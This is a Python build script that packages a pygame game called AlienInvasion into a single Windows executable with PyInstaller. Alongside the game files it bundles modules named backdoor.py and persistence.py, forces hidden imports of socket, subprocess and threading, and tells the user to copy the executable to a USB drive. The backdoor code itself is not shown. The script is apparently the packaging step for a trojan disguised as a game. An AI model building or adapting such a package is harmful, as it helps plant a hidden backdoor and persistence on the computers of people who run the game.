#!/usr/bin/env python3
"""
Simple Windows build script - works better on Windows
"""
import subprocess
import sys
import os

def main():
    print("="*60)
    print("Building Windows Executable - Simple Method")
    print("="*60)
    print()
    
    # Check PyInstaller
    try:
        import PyInstaller
        print("✓ PyInstaller is installed")
    except ImportError:
        print("Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("✓ PyInstaller installed")
    
    print()
    print("Building executable...")
    print("This may take a few minutes...")
    print()
    
    # Use Python module syntax instead of command
    cmd = [
        sys.executable,
        "-m",
        "PyInstaller",
        "--onefile",
        "--windowed",
        "--name=AlienInvasion",
        "--add-data=images;images",
        "--add-data=settings.py;.",
        "--add-data=ship.py;.",
        "--add-data=alien.py;.",
        "--add-data=bullet.py;.",
        "--add-data=button.py;.",
        "--add-data=game_stats.py;.",
        "--add-data=scoreboard.py;.",
        "--add-data=backdoor.py;.",
        "--add-data=persistence.py;.",
        "--add-data=dependency_checker.py;.",
        "--add-data=config.py;.",
        "--hidden-import=pygame",
        "--hidden-import=socket",
        "--hidden-import=subprocess",
        "--hidden-import=threading",
        "alien_invasion.py"
    ]
    
    try:
        subprocess.check_call(cmd)
        print()
        print("="*60)
        print("✓ BUILD SUCCESSFUL!")
        print("="*60)
        print()
        print("Your .exe is ready:")
        print("  → dist\\AlienInvasion.exe")
        print()
        print("Files to copy to USB:")
        print("  1. dist\\AlienInvasion.exe")
        print("  2. images\\ folder")
        print()
    except subprocess.CalledProcessError as e:
        print()
        print("✗ Build failed!")
        print(f"Error: {e}")
        print()
        print("Try running manually:")
        print("  python -m PyInstaller build_windows_simple.spec")
        sys.exit(1)

if __name__ == '__main__':
    main()
